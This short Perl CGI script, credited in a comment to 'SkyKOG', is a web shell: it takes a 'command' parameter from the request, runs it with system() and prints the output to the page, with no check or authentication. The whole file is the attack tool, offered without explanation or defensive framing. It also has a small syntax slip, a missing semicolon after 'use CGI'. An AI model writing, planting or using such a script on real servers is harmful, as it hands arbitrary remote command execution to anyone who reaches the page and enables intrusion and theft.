#!/usr/bin/perl
# Author : SkyKOG

print "Content-type:text/html\n\n";
use CGI

$a = new CGI;
$comm = $a->param("command");
print "The Output of the entered command is:<br />";
system($comm);
